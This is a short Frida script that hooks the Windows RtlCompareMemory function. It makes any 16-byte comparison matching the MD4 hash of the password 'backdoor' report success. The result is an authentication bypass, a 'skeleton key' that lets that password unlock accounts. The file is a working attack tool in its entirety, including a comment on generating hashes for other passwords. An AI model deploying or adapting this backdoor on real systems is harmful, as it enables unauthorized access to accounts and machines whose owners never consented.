const RtlCompareMemory = Module.getExportByName('ntdll.dll', 'RtlCompareMemory');

// generate bytearrays with python:
// import hashlib;print([ord(x) for x in hashlib.new('md4', 'backdoor'.encode('utf-16le')).digest()])
//const newPassword = new Uint8Array([136, 70, 247, 234, 238, 143, 177, 23, 173, 6, 189, 216, 48, 183, 88, 108]); // password
const newPassword = new Uint8Array([22, 115, 28, 159, 35, 140, 92, 43, 79, 18, 148, 179, 250, 135, 82, 84]); // backdoor

Interceptor.attach(RtlCompareMemory, {
  onEnter: function (args) {
    this.compare = 0;
    if (args[2] == 0x10) {
      const attempt = new Uint8Array(ptr(args[1]).readByteArray(16));
      this.compare = 1;
      this.original = attempt;
    }
  },
  onLeave: function (retval) {
    if (this.compare == 1) {
      var match = true;
      for (var i = 0; i != this.original.byteLength; i++) {
        if (this.original[i] != newPassword[i]) {
          match = false;
        }
      }

      if (match) {
        retval.replace(16);
      }
    }
  }
});